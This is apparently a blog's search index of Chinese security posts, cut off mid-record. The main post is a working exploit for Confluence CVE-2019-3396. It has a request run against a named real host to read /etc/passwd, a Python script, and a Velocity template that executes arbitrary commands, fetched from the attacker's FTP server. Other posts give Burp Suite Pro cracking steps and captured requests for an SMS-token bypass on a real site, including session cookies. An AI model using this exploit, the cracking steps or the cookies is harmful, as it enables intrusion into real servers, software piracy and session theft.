<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Confluence SSRF及远程代码执行漏洞（CVE-2019-3395\CVE-2019-3396)</title>
      <link href="/2019/04/10/CVE-2019-3396/"/>
      <url>/2019/04/10/CVE-2019-3396/</url>
      
        <content type="html"><![CDATA[<h2 id="服务寻找"><a href="#服务寻找" class="headerlink" title="服务寻找"></a>服务寻找</h2><p>直接fofa搜索</p><p><img src="http://secquan.zzyuncheng.com/89dd264bcdcc7f7780ecbcc7f6791bb8.png-quanzi" alt="file"><br>选择可以正常访问的页面</p><p><img src="http://secquan.zzyuncheng.com/6abd16688af544c40178ad6a924dfa23.png-quanzi" alt="file"><br>确认版本在漏洞范围内</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">【漏洞评级】高危</span><br><span class="line"></span><br><span class="line">【CVE编号】CVE-2019-3395\CVE-2019-3396</span><br><span class="line"></span><br><span class="line">【影响范围】</span><br><span class="line"></span><br><span class="line">Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*</span><br><span class="line"></span><br><span class="line">Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*</span><br><span class="line"></span><br><span class="line">Confluence 6.6.* &lt; 6.6.12</span><br><span class="line"></span><br><span class="line">Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*</span><br><span class="line"></span><br><span class="line">Confluence 6.12.* &lt; 6.12.3</span><br><span class="line"></span><br><span class="line">Confluence 6.13.* &lt; 6.13.3</span><br><span class="line"></span><br><span class="line">Confluence 6.14.* &lt; 6.14.2</span><br><span class="line"></span><br><span class="line">【不受影响的版本】</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.6.12</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.12.3</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.13.3</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.14.2</span><br><span class="line"></span><br><span class="line">Confluence  6.15.1</span><br></pre></td></tr></table></figure><h2 id="手工验证"><a href="#手工验证" class="headerlink" title="手工验证"></a>手工验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1  </span><br><span class="line">Host: service.jianzhitech.cn:9000  </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0  </span><br><span class="line">Accept: application/json, text/javascript, _/_; q=0.01  </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3  </span><br><span class="line">Accept-Encoding: gzip, deflate  </span><br><span class="line">Content-Type: application/json  </span><br><span class="line">X-Requested-With: XMLHttpRequest  </span><br><span class="line">Referer: [http://service.jianzhitech.cn:9000/login.action?os\_destination=%2F](http://service.jianzhitech.cn:9000/login.action?os_destination=%2F)  </span><br><span class="line">Content-Length: 180  </span><br><span class="line">Cookie: JSESSIONID=3FDE6BE22B77741044106D452E025D04  </span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;65601&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;[https://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;\_template&quot;:&quot;file:////etc/passwd&quot;&#125;,&quot;body](https://www.dailymotion.com/video/xcpa64)&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://secquan.zzyuncheng.com/1e09fd3d94cf93d45bdab2a920763ec4.png-quanzi" alt="file"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>首先需要一台外网的服务器<br>exp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def _read(url):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    # filename = &quot;../web.xml&quot;</span><br><span class="line">    filename = &apos;file:////etc/group&apos;</span><br><span class="line"></span><br><span class="line">    paylaod = url + &quot;/rest/tinymce/1/macro/preview&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;,</span><br><span class="line">        &quot;Referer&quot;: url + &quot;/pages/resumedraft.action?draftId=12345&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &apos;&#123;&quot;contentId&quot;:&quot;12345&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc5&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;%s&quot;&#125;&#125;&#125;&apos; % filename</span><br><span class="line">    r = requests.post(paylaod, data=data, headers=headers)</span><br><span class="line">    # print r.content</span><br><span class="line">    if r.status_code == 200 and &quot;wiki-content&quot; in r.text:</span><br><span class="line">        m = re.findall(&apos;.*wiki-content&quot;&gt;\n(.*)\n            &lt;/div&gt;\n&apos;, r.text, re.S)</span><br><span class="line"></span><br><span class="line">    return m[0]</span><br><span class="line"></span><br><span class="line">def _exec(url,cmd):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    filename = &quot;ftp://192.168.50.181/rce.vm&quot;</span><br><span class="line"></span><br><span class="line">    paylaod = url + &quot;/rest/tinymce/1/macro/preview&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;,</span><br><span class="line">        &quot;Referer&quot;: url + &quot;/pages/resumedraft.action?draftId=12345&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &apos;&#123;&quot;contentId&quot;:&quot;12345&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;http://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;%s&quot;,&quot;cmd&quot;:&quot;%s&quot;&#125;&#125;&#125;&apos; % (filename,cmd)</span><br><span class="line">    r = requests.post(paylaod, data=data, headers=headers)</span><br><span class="line">    # print r.content</span><br><span class="line">    if r.status_code == 200 and &quot;wiki-content&quot; in r.text:</span><br><span class="line">        m = re.findall(&apos;.*wiki-content&quot;&gt;\n(.*)\n            &lt;/div&gt;\n&apos;, r.text, re.S)</span><br><span class="line"></span><br><span class="line">    return m[0]</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    cmd = sys.argv[2]</span><br><span class="line">    print _exec(url,cmd)</span><br></pre></td></tr></table></figure><p>rce.vm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($e=&quot;exp&quot;)</span><br><span class="line">#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1\.使用FTP加载vm文件  </span><br><span class="line">2\.修改filename为自己的vm文件路径，例如 filename = &quot;ftp://192.168.50.181/rce.vm&quot;  </span><br><span class="line">3\.python CVE-2019-3396.py [http://ip:port](http://ip) &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>这里我用的是python2</p><p>pip install pyftpdlib</p><p>python -m pyftpdlib -p 2130</p><p>直接截的同事的图<br><img src="http://secquan.zzyuncheng.com/8720a1b0848253be60a036fa59bf9173.png-quanzi" alt="file"></p><h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p><img src="http://secquan.zzyuncheng.com/4c1c6d6b38be7ef308bc5a0197feb7e8.png-quanzi" alt="file"></p><p><img src="http://secquan.zzyuncheng.com/5eb1820b8b8cc6a91e3c2f23e037dc3c.png-quanzi" alt="file"></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mac渗透初试探</title>
      <link href="/2019/03/19/mac%E6%B8%97%E9%80%8F%E5%88%9D%E8%AF%95%E6%8E%A2/"/>
      <url>/2019/03/19/mac%E6%B8%97%E9%80%8F%E5%88%9D%E8%AF%95%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>windows下安装最清爽的burpsuite1.7系列</p></blockquote><h3 id="官网下载原版"><a href="#官网下载原版" class="headerlink" title="官网下载原版"></a>官网下载原版</h3><p><img src="https://upload-images.jianshu.io/upload_images/16895266-2747e6e4f55743f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-5971cf8c8902e001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>然后安装</p><h2 id="下载破解补丁"><a href="#下载破解补丁" class="headerlink" title="下载破解补丁"></a>下载破解补丁</h2><p>链接: <a href="https://pan.baidu.com/s/1brjPKM7" target="_blank" rel="noopener">https://pan.baidu.com/s/1brjPKM7</a> 密码: 9v4r</p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-6d23913870bf47b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="下载jdk环境"><a href="#下载jdk环境" class="headerlink" title="下载jdk环境"></a>下载jdk环境</h2><p><a href="https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-windows-x64.exe?AuthParam=1552965316_da70718dc80b250a1aa668a34cf319a7" target="_blank" rel="noopener">https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-windows-x64.exe?AuthParam=1552965316_da70718dc80b250a1aa668a34cf319a7</a></p><h2 id="激活burp"><a href="#激活burp" class="headerlink" title="激活burp"></a>激活burp</h2><p>将burpsuite_pro_v1.7.36.jar改名</p><p>为burpsuite_community.jar</p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-48afe10fb117f7ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>修改BurpSuiteCommunity.vmoptions文件为以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Xmx4096m</span><br><span class="line"></span><br><span class="line">-Xbootclasspath/p:burp-loader-keygen.jar</span><br></pre></td></tr></table></figure><p>正常打开burp进行破解</p><h1 id="安装burpsuite"><a href="#安装burpsuite" class="headerlink" title="安装burpsuite"></a>安装burpsuite</h1><p>需要下载好burp及其破解工具，过于简单，这里不讲，主要mac设置</p><h1 id="下载burp汉化包"><a href="#下载burp汉化包" class="headerlink" title="下载burp汉化包"></a>下载burp汉化包</h1><p><a href="https://files.zsxq.com/FmaFRIllULVvDbtX6ioIVSILI9YS?attname=BurpSuiteCn.jar.zip&amp;e=1906272000&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:8KW62C9XAkqbmFJkBlj-63zFOdo=" target="_blank" rel="noopener">点击下载</a></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-a6d798a015df2634.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h2 id="新建一个sh，例如burp-sh"><a href="#新建一个sh，例如burp-sh" class="headerlink" title="新建一个sh，例如burp.sh"></a>新建一个sh，例如burp.sh</h2><p>vim burp.sh</p><h2 id="写入以下内容："><a href="#写入以下内容：" class="headerlink" title="写入以下内容："></a>写入以下内容：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Desktop</span><br><span class="line">nohup java -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar burpsuite_pro_v2.0beta.jar &amp;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="赋予执行权限"><a href="#赋予执行权限" class="headerlink" title="赋予执行权限"></a>赋予执行权限</h2><p>chmod u+x burp.sh</p><h2 id="编辑你的环境变量"><a href="#编辑你的环境变量" class="headerlink" title="编辑你的环境变量"></a>编辑你的环境变量</h2><p>vim ~/.bash_profile</p><p>#在末尾新增一行<br>alias burp=burp.sh的绝对路径<br>如<br>alias burp=~/Desktop/burp.sh</p><h2 id="应用环境变量"><a href="#应用环境变量" class="headerlink" title="应用环境变量"></a>应用环境变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure><p>以后你只需要在Mac控制台输入burp<br>安装了zsh的可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure></p><p>让他每次都生效。<br><img src="https://upload-images.jianshu.io/upload_images/14134003-da9ad0eb3e54fea9.gif?imageMogr2/auto-orient/strip" alt="burp"></p><blockquote><p>mac跟windows真的一点不一样。建议还是别买了。<br>这里整理一下我的mac电脑使用坑。<br>类似于linux的apt和yum的自动安装，mac一般用homebrew</p></blockquote><h2 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h2><p>首先进入<a href="https://brew.sh" target="_blank" rel="noopener">https://brew.sh</a><br>然后复制执行命令<br><img src="https://upload-images.jianshu.io/upload_images/14134003-81013342e669673f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="brew"></p><h2 id="第一次安装的时候一直报错"><a href="#第一次安装的时候一直报错" class="headerlink" title="第一次安装的时候一直报错"></a>第一次安装的时候一直报错</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fatal: The remote end hung up unexpectedly</span><br><span class="line">fatal: early EOF</span><br><span class="line">fatal: index-pack failed</span><br></pre></td></tr></table></figure><p>我以为是墙的原因，所以我下载了一个SS,挂上代理开全局重新安装<br><img src="https://upload-images.jianshu.io/upload_images/14134003-7ad5af91a59f7fca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="还是报错"><a href="#还是报错" class="headerlink" title="还是报错"></a>还是报错</h2><p>又看到有人说<br>出现这个错误的原因是项目太久，tag资源文件太大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解决方式：</span><br><span class="line"></span><br><span class="line">   命令终端输入</span><br><span class="line"></span><br><span class="line">    git config --global http.postBuffer 524288000       </span><br><span class="line"></span><br><span class="line">  然后在重新执行brew安装命令即可</span><br></pre></td></tr></table></figure></p><p>我也尝试了，然后还是不行，我以为是没重启，又重启了一次，仍然失败。<br>过了一天，再安装就成功了。</p><h2 id="有人说把install镜像更换为国内的就可以了"><a href="#有人说把install镜像更换为国内的就可以了" class="headerlink" title="有人说把install镜像更换为国内的就可以了"></a>有人说把install镜像更换为国内的就可以了</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将brew的install文件下载本地</span><br><span class="line">      终端输入 curl -fsSL [https://raw.githubusercontent.com/Homebrew/install/master/install](https://raw.githubusercontent.com/Homebrew/install/master/install) &gt;&gt; brew_install</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2、修改install文件的镜像源</span><br><span class="line">终端输入 vim brew_install</span><br><span class="line">将下面两行进行修改</span><br><span class="line">#BREW_REPO = &quot;[https://github.com/Homebrew/brew”.freeze](https://github.com/Homebrew/brew%E2%80%9D.freeze)</span><br><span class="line">#CORE_TAP_REPO = “[https://github.com/Homebrew/homebrew-core](https://github.com/Homebrew/homebrew-core)”.freeze</span><br><span class="line">替换成下面两句</span><br><span class="line">BREW_REPO = “[https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git](https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git)”.freeze</span><br><span class="line">CORE_TAP_REPO = &quot;[https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git”.freeze](https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git%E2%80%9D.freeze)</span><br><span class="line">#就是“BREW_REPO”和“CORE_TAP_REPO”这两项，将其修改为清华的镜像</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、安装</span><br><span class="line">ruby ~/brew_install</span><br></pre></td></tr></table></figure><h2 id="apktool安装"><a href="#apktool安装" class="headerlink" title="apktool安装"></a>apktool安装</h2><p>一开始我直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install apktool</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c8daccabdbc1e248.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>提示下载失败，老老实实打开vpn</p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-741ff9aea6d4cf49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="dex2jar安装"><a href="#dex2jar安装" class="headerlink" title="dex2jar安装"></a>dex2jar安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install dex2jar</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-f38ec4aca7f715bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="反编译软件安装"><a href="#反编译软件安装" class="headerlink" title="反编译软件安装"></a>反编译软件安装</h2><blockquote><p>jd-gui之前都是使用exe的，因为在mac下，所以这里我下载jar格式的。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-800e303ce9c4d4bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>官网凉了(jd.benow.ca)，我换个反编译软件。<br>procyon-decompiler-luyten <a href="https://github.com/deathmarine/Luyten" target="_blank" rel="noopener">https://github.com/deathmarine/Luyten</a></p><p>Jadx <a href="https://github.com/skylot/jadx/" target="_blank" rel="noopener">https://github.com/skylot/jadx/</a>。</p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-1ebce39e87ce3caa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite短信发送绕过Token保护</title>
      <link href="/2019/02/26/burpsuite%E7%9F%AD%E4%BF%A1%E5%8F%91%E9%80%81%E7%BB%95%E8%BF%87Token%E4%BF%9D%E6%8A%A4/"/>
      <url>/2019/02/26/burpsuite%E7%9F%AD%E4%BF%A1%E5%8F%91%E9%80%81%E7%BB%95%E8%BF%87Token%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="第一个请求"><a href="#第一个请求" class="headerlink" title="第一个请求"></a>第一个请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /broadcast/api/captcha/formtoken HTTP/1.1</span><br><span class="line">Host: e.dxy.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-XSRF-TOKEN: nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9</span><br><span class="line">Referer: https://e.dxy.cn/broadcast/my/info</span><br><span class="line">Cookie: _ga=GA1.2.1060500756.1551167330; _gid=GA1.2.754575247.1551167330; JUTE_BBS_DATA=468d0283c978f647baafac3640c770dd2aa5da94bc74a1b446454d24a95d73af2871dace5332d3a7b837df5cf119bcf072c2e546db6ae4b6a20263cc55b0dc7c0c3a0283673a8b2cefb17a58c9372082; route_e_broadcast=e49be6a222ecd36085950f667b0f5a8e; PHPSESSID=hn2enr413f1l32rt044fr2ssmpkj6jq7; XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; Hm_lvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; Hm_lpvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; DXY_USER_GROUP=60; JUTE_TOKEN=23b5b865-4a56-42ad-b098-17cdbb1c4a28</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="第一个应答"><a href="#第一个应答" class="headerlink" title="第一个应答"></a>第一个应答</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 26 Feb 2019 07:56:52 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Cache-Control: private, must-revalidate</span><br><span class="line">pragma: no-cache</span><br><span class="line">expires: -1</span><br><span class="line">Set-Cookie: XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; expires=Wed, 13-Mar-2019 07:56:52 GMT; Max-Age=1296000; path=/</span><br><span class="line">Set-Cookie: dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; path=/</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;mh99xIcgSbHmUSyJOsCJsICPjMnJOjOBp8oPGdco&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="第二个请求"><a href="#第二个请求" class="headerlink" title="第二个请求"></a>第二个请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /broadcast/index/api-phoneCode HTTP/1.1</span><br><span class="line">Host: e.dxy.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-XSRF-TOKEN: nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9</span><br><span class="line">Referer: https://e.dxy.cn/broadcast/my/info</span><br><span class="line">Content-Length: 80</span><br><span class="line">Cookie: _ga=GA1.2.1060500756.1551167330; _gid=GA1.2.754575247.1551167330; JUTE_BBS_DATA=468d0283c978f647baafac3640c770dd2aa5da94bc74a1b446454d24a95d73af2871dace5332d3a7b837df5cf119bcf072c2e546db6ae4b6a20263cc55b0dc7c0c3a0283673a8b2cefb17a58c9372082; route_e_broadcast=e49be6a222ecd36085950f667b0f5a8e; PHPSESSID=hn2enr413f1l32rt044fr2ssmpkj6jq7; XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; Hm_lvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; Hm_lpvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; DXY_USER_GROUP=60; JUTE_TOKEN=23b5b865-4a56-42ad-b098-17cdbb1c4a28</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type=verify&amp;phone=13888888888&amp;formtoken=mh99xIcgSbHmUSyJOsCJsICPjMnJOjOBp8oPGdco</span><br></pre></td></tr></table></figure><h2 id="第二个应答"><a href="#第二个应答" class="headerlink" title="第二个应答"></a>第二个应答</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 